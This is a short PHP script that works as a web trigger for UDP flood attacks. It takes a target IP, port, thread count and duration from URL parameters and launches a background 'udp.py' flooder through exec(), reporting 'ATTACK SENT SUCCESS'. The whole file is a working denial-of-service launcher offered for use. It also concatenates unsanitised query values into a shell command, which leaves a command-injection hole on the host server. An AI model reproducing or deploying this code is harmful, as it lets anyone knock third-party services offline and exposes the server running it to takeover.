<?php
if (isset($_GET['ip']) && isset($_GET['port']) && isset($_GET['thread']) && isset($_GET['time'])) {
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    $thread = $_GET['thread'];
    $time = $_GET['time'];

    $command = "nohup python3 udp.py $ip $port $thread $time > /dev/null 2>&1 &";
    exec($command, $output, $return_var);

    if ($return_var == 0) {
        echo "ATTACK SENT SUCCESS => [$ip:$port] in [$time] seconds\n";
        foreach ($output as $line) {
            echo $line . "<br>";
        }
    } else {
        echo "ATTACK SENT FALSE!!!\n";
    }
} else {
    echo "Please input ip, port, thread, time in URL";
}
?>
